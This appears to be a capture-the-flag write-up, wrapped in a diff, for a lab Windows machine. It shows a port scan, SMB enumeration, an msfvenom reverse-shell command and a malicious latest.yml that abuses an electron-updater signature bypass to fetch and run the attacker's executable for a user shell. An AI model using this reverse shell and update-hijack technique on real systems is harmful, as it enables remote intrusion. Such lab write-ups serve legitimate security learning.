@@ -1,0 +1,70 @@
+I"�<p>Found these ports :
+Host: 10.10.10.237</p>
+
+<ul>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>80 / open / tcp /  / http /  / Apache httpd 2.4.46 ((Win64) OpenSSL</td>
+          <td>1.1.1j PHP</td>
+          <td>7.3.27) /</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>135 / open / tcp /  / msrpc /  / Microsoft Windows RPC /</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>443 / open / tcp /  / ssl</td>
+          <td>http /  / Apache httpd 2.4.46 ((Win64) OpenSSL</td>
+          <td>1.1.1j PHP</td>
+          <td>7.3.27) / ,</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>445 / open / tcp /  / microsoft-ds /  / Windows 10 Pro</li>
+  <li>19042 microsoft-ds (workgroup: WORKGROUP) /</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>5985 / open / tcp /  / http /  / Microsoft HTTPAPI httpd 2.0 (SSDP</td>
+          <td>UPnP)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>6379 / open / tcp /  / redis /  / Redis key-value store</li>
+</ul>
+
+<p>Port 445 is SMB, we connect using <code class="language-plaintext highlighter-rouge">smbclient</code>
+<code class="language-plaintext highlighter-rouge">smbclient -L \\\\10.10.10.237\\</code>
+We have a list of services :
+<img src="/assets/Pasted%20image%2020210706175629.png%7C500" alt="Pasted image 20210706175629.png|500" />
+We connect to the service <code class="language-plaintext highlighter-rouge">Software_Updates</code>, we find directories and a pdf, we download the PDF. “UAT_Testing_Procedures.pdf”</p>
+
+<p>We see that they are using electron-builder to build their apps. We google about it, and we find this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blogpost</a> which explains the vulnerability.</p>
+
+<p>We have to provide a <code class="language-plaintext highlighter-rouge">latest.yml</code> to trigger the update, and use a malicious file with a quote <code class="language-plaintext highlighter-rouge">'</code> in the filename to bypass signature validation.</p>
+
+<p>We compile a reverse shell using msfvenom, this will be our malicious update.
+<code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; r\'evshell.exe</code>
+And our <code class="language-plaintext highlighter-rouge">latest.yml</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s">1.1.2</span>
+<span class="na">files</span><span class="pi">:</span>
+  <span class="na">url</span><span class="pi">:</span> <span class="s">http://10.10.15.1/r'evshell.exe</span>
+  <span class="na">sha512</span><span class="pi">:</span> <span class="s">jnn1I3GMG4YfeWQqC6iHz+LJRUBVZS/3C9pc++s1b8i0cS8lM+Dp14h4G33/sh62VelWi5y7aCyphkXDR+XnHg==</span>
+
+<span class="na">path</span><span class="pi">:</span> <span class="s">http://10.10.15.1/r'evshell.exe</span>
+<span class="na">sha512</span><span class="pi">:</span> <span class="s">jnn1I3GMG4YfeWQqC6iHz+LJRUBVZS/3C9pc++s1b8i0cS8lM+Dp14h4G33/sh62VelWi5y7aCyphkXDR+XnHg==</span>
+</code></pre></div></div>
+
+<p>We upload the file to the client folder with our SMB access, setup a netcat listener, HTTP server with Python and wait a while for the update to trigger.</p>
+
+<p>We get a shell, and we are user <code class="language-plaintext highlighter-rouge">jason</code> got to Desktop to get user flag.</p>
+:ET
